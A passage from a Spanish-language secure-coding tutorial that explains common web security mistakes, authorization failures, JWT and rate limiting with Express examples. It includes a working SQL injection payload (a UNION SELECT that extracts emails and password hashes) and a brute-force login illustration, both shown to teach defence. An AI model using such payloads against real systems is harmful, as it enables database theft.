    //   qué tabla intentabas consultar y dónde falló
  });
}

// ✅ Error genérico al cliente, detalle solo en logs internos
} catch (error) {
  console.error('[ERROR INTERNO]', error); // solo visible en servidor
  res.status(500).json({ error: "Error interno del servidor" });
}
```

#### Error 4 — Dependencias desactualizadas

Cada librería que instalas es una superficie de ataque potencial. Una dependencia con vulnerabilidad conocida es una puerta abierta.

```bash
# Ver vulnerabilidades en tu proyecto Node.js
npm audit

# Output posible:
# 3 vulnerabilities (1 moderate, 2 high)
# → lodash < 4.17.21 → Prototype Pollution
# → axios < 0.21.1  → SSRF vulnerability
```

> El ataque a Equifax (2017) que expuso datos de 147 millones de personas fue posible por una dependencia de Apache Struts sin actualizar, con una vulnerabilidad conocida y con parche disponible desde hacía dos meses.

#### Error 5 — No implementar rate limiting

Sin límite de intentos, un atacante puede probar contraseñas o hacer requests indefinidamente.

```javascript
// ❌ Sin límite — permite fuerza bruta
app.post('/login', async (req, res) => {
  // un atacante puede hacer 10.000 intentos por segundo
});

// ✅ Con rate limiting
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // ventana de 15 minutos
  max: 5,                    // máximo 5 intentos
  message: 'Demasiados intentos, intenta más tarde'
});

app.post('/login', loginLimiter, async (req, res) => { ... });
```

### ¿Qué pasaría si...?

#### ❌ No validas inputs

```
Escenario: campo de búsqueda sin validación

Input normal:   "zapatos rojos"
                → SELECT * FROM productos WHERE nombre LIKE '%zapatos rojos%'
                → Resultado esperado ✅

Input malicioso: "x' UNION SELECT email,password,null FROM usuarios --"
                → SELECT * FROM productos WHERE nombre LIKE '%x'
                   UNION SELECT email,password,null FROM usuarios --'
                → Devuelve emails y hashes de todos los usuarios ❌
```

**Consecuencias reales:**
- Extracción completa de la base de datos
- Modificación o eliminación de registros
- Escalada de privilegios (convertirse en admin)
- Si el input va al HTML sin sanitizar → XSS contra todos los usuarios

#### ❌ No proteges rutas

```javascript
// ❌ Rutas de admin sin verificación de rol
app.get('/admin/usuarios', async (req, res) => {
  // Solo verifica que haya sesión, no que sea admin
  if (!req.usuario) return res.status(401).json({ error: "No autenticado" });

  const usuarios = await db.usuarios.findAll();
  res.json(usuarios); // cualquier usuario logueado llega aquí
});
```

```
Escenario real:
→ Usuario normal se registra con email y contraseña
→ Descubre la ruta /admin/usuarios (visible en el código frontend
   o simplemente adivinando)
→ Accede a la lista completa de usuarios del sistema
→ Puede iterar sobre /admin/usuarios/:id/eliminar
→ Borra cuentas arbitrariamente
```

**Consecuencias reales:**
- Acceso a datos de todos los usuarios
- Operaciones destructivas sin autorización
- En sistemas financieros: transferencias, modificación de saldos
- Escalada hasta control total del sistema

#### ❌ No usas HTTPS

```
Escenario: usuario usa tu app en WiFi público (café, aeropuerto)

Sin HTTPS — lo que cualquiera en esa red puede capturar:

POST /api/login
Content-Type: application/json

{
  "email": "maria@mail.com",
  "password": "MiContraseña2024"
}

→ Email y contraseña en texto plano
→ Visibles con Wireshark (herramienta gratuita, 5 minutos de setup)
→ El atacante no necesita "hackear" nada — solo escuchar
```

Y no es solo el login:

```
GET /api/perfil
Authorization: Bearer eyJhbGci...

→ Token de sesión expuesto
→ El atacante lo usa para hacer requests autenticados
→ Tiene acceso completo a la cuenta sin necesitar la contraseña
→ Cambiar la contraseña no ayuda — el token sigue válido
```

**Consecuencias reales:**
- Robo de credenciales en redes públicas
- Session hijacking (robo de sesión activa)
- Manipulación de datos en tránsito
- En apps móviles: especialmente crítico porque los usuarios frecuentemente usan redes desconocidas

### El patrón común detrás de todos estos errores

```
"Lo arreglo después"     →  después nunca llega
"Es un proyecto pequeño" →  los proyectos crecen
"Nadie va a atacar esto" →  los ataques son automatizados,
                             no personales
"El frontend ya valida"  →  el frontend se puede bypassear
                             en segundos con DevTools
```

La seguridad no es una feature que se agrega al final — es una forma de escribir código desde el principio. El costo de corregir una vulnerabilidad después de producción es entre 10 y 100 veces mayor que prevenirla durante el desarrollo.

## 🌍 Caso práctico real

Escenario:

> “Un usuario logra acceder a información que no le corresponde.”
> 

### ¿Qué falló?

Para saberlo habría que revisar el código del backend y los logs de acceso, pero dado el escenario, lo más probable es que el sistema haya verificado que el usuario tuviera sesión iniciada, pero no que el recurso que estaba pidiendo realmente le perteneciera. Es decir, **la autenticación funcionó — la autorización no**.

### ¿Es problema de permisos, vulnerabilidad o intrusión?

En este escenario son **los tres a la vez**. Hay una vulnerabilidad porque el sistema tiene una falla en cómo controla el acceso a los recursos. Esa falla es un problema de permisos porque la autorización está incompleta. Y el resultado es una intrusión porque el usuario terminó accediendo a información que no le corresponde, aunque haya entrado al sistema de forma legítima.

### ¿Cómo lo evitarías como developer?

Con **buenas prácticas de autorización**: siempre verificar en el backend que el recurso solicitado pertenece al usuario que lo está pidiendo, no solo que ese usuario tenga sesión activa. Complementariamente, usar identificadores no predecibles dificulta que alguien pueda intentar adivinar o iterar sobre recursos ajenos, y tener monitoreo de accesos permite detectar comportamientos anómalos antes de que el daño sea mayor.

## 🧪 Analogía - El Hospital

Todos los conceptos mapeados a un hospital público:

| Concepto | Analogía |
|---|---|
| **Permissions** | El carnet de identificación del personal: una enfermera puede entrar a las salas de pacientes pero no al quirófano; un cirujano puede entrar al quirófano pero no a la sala de registros administrativos; solo el director puede entrar a todas partes |
| **Password** | El código PIN que cada médico marca en el lector de la puerta antes de mostrar su carnet — sin el código, el carnet solo no abre nada |
| **Vulnerabilidad** | Una puerta de acceso restringido que alguien dejó entornada porque el mecanismo de cierre está roto — no es que alguien haya entrado todavía, pero la condición para que ocurra ya existe |
| **Intrusión** | Una persona sin identificación que aprovecha la puerta entornada, se pone una bata blanca que encontró en el pasillo y camina por zonas restringidas sin que nadie le pregunte nada |
| **Seguridad de red** | El sistema completo del hospital que regula quién entra al edificio, qué puertas puede abrir adentro, qué puede llevarse al salir y quién vigila los pasillos — no es una sola cosa sino todo funcionando en conjunto |

## 🧠 Bonus — JWT, Tokens y Rate Limiting

### ¿Qué es autenticación con tokens?

Para entender JWT primero hay que entender el problema que los tokens resuelven.

HTTP es un protocolo **sin memoria** — cada request es independiente y el servidor no recuerda nada del anterior. Esto significa que sin algún mecanismo adicional, el servidor no puede saber si la persona que hace un request ya inició sesión o no.

Históricamente esto se resolvía con **sesiones**: el servidor guardaba en su memoria que el usuario X estaba autenticado, y le daba al cliente un ID de sesión para presentar en cada request. Funciona, pero tiene un problema: el servidor tiene que mantener ese estado, lo que complica escalar la aplicación.

Los **tokens** resuelven esto de otra forma: en lugar de que el servidor recuerde quién está autenticado, le entrega al cliente un documento firmado que contiene toda la información necesaria. El cliente lo presenta en cada request y el servidor lo verifica — sin necesitar recordar nada.

```
Sesiones (stateful):               Tokens (stateless):
                                   
Cliente → login → Servidor         Cliente → login → Servidor
Servidor guarda: "usuario 42       Servidor genera un token
está autenticado"                  con la info del usuario
Servidor → session ID → Cliente    Servidor → token → Cliente

Cliente → request + session ID     Cliente → request + token
Servidor busca session ID          Servidor verifica el token
en su memoria                      (no necesita memoria)
```

---

### ¿Qué es JWT?

JWT (JSON Web Token, pronunciado "yot") es el **formato estándar más usado para implementar autenticación con tokens**. Es básicamente un documento JSON firmado digitalmente que contiene información sobre el usuario.

Un JWT tiene tres partes separadas por puntos:

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyfQ.xK92mP7Lm...
        ↑                      ↑                  ↑
    HEADER                  PAYLOAD            SIGNATURE
  (algoritmo              (datos del          (firma digital)
   de firma)               usuario)
```

Cada parte es JSON codificado en Base64. Decodificado se ve así:

```json
// HEADER
{
  "alg": "HS256",
  "typ": "JWT"
}

// PAYLOAD — la información que el servidor necesita
{
  "userId": 42,
  "email": "maria@mail.com",
  "role": "admin",
  "exp": 1714000000  // fecha de expiración
}

// SIGNATURE — generada con una clave secreta que solo el servidor conoce
HMACSHA256(header + "." + payload, clave_secreta)
```

La firma es lo que hace al JWT confiable. El cliente puede leer el payload (no está cifrado, solo codificado), pero **no puede modificarlo** — si lo modifica, la firma deja de ser válida y el servidor lo rechaza.

#### El flujo completo

```
1. Usuario hace login con email y contraseña
             ↓
2. Servidor verifica credenciales
             ↓
3. Servidor genera JWT firmado con su clave secreta
             ↓
4. Servidor envía JWT al cliente
             ↓
5. Cliente guarda el JWT (localStorage o cookie)
             ↓
6. En cada request, cliente envía el JWT en el header:
   Authorization: Bearer eyJhbGci...
             ↓
7. Servidor verifica la firma del JWT
   → Si es válida: procesa el request
   → Si no es válida o expiró: 401 Unauthorized
```

#### Lo que nunca debe hacerse con JWT

```javascript
// ❌ Guardar información sensible en el payload
{
  "userId": 42,
  "password": "MiContraseña123",  // el payload es legible por el cliente
  "tarjeta": "4111111111111111"    // nunca poner datos sensibles aquí
}

// ❌ JWT sin expiración
{
  "userId": 42
  // sin "exp" → el token es válido para siempre
  // si es robado, el atacante tiene acceso indefinido
}

// ✅ JWT mínimo y con expiración
{
  "userId": 42,
  "role": "user",
  "exp": 1714000000  // expira en 1 hora, 24 horas, según el caso
}
```

---

### ¿Qué es Rate Limiting?

Rate limiting es **poner un límite a cuántas veces alguien puede hacer una acción en un período de tiempo determinado**. Es el equivalente digital del cartel de "máximo 3 turnos por persona" en una fila.

Sin rate limiting, un atacante puede automatizar requests indefinidamente:

```
Sin rate limiting — ataque de fuerza bruta al login:

10:00:00 → POST /login { password: "000000" } → 401
10:00:00 → POST /login { password: "000001" } → 401
10:00:00 → POST /login { password: "000002" } → 401
... (10.000 intentos por segundo)
10:00:03 → POST /login { password: "482901" } → 200 ✅
```

Con rate limiting:

```
Con rate limiting — mismo ataque:

10:00:00 → POST /login { password: "000000" } → 401
10:00:01 → POST /login { password: "000001" } → 401
10:00:02 → POST /login { password: "000002" } → 401
10:00:03 → POST /login { password: "000003" } → 401
10:00:04 → POST /login { password: "000004" } → 401
10:00:05 → POST /login { password: "000005" } → 429 Too Many Requests
           "Has excedido el límite. Intenta en 15 minutos."

→ Para probar 1.000.000 de combinaciones necesitaría
  años en lugar de segundos
```

#### Dónde aplicar rate limiting

No solo en el login — hay varios endpoints que lo necesitan:

| Endpoint | Por qué limitarlo |
|---|---|
| `POST /login` | Prevenir fuerza bruta de contraseñas |
| `POST /registro` | Prevenir creación masiva de cuentas falsas |
| `POST /recuperar-password` | Prevenir spam de emails y enumeración de usuarios |
| `GET /api/*` | Prevenir abuso general de la API |
| `POST /comentarios` | Prevenir spam de contenido |

#### Implementación básica

```javascript
const rateLimit = require('express-rate-limit');

// Límite específico para login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // ventana de 15 minutos
  max: 5,                     // máximo 5 intentos por ventana
  message: {
    error: 'Demasiados intentos. Intenta nuevamente en 15 minutos.'
  },
  standardHeaders: true       // incluye info del límite en los headers
});

// Límite general para toda la API
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,        // ventana de 1 minuto
  max: 100                    // máximo 100 requests por minuto
});

app.post('/login', loginLimiter, autenticar);
app.use('/api/', apiLimiter);
```
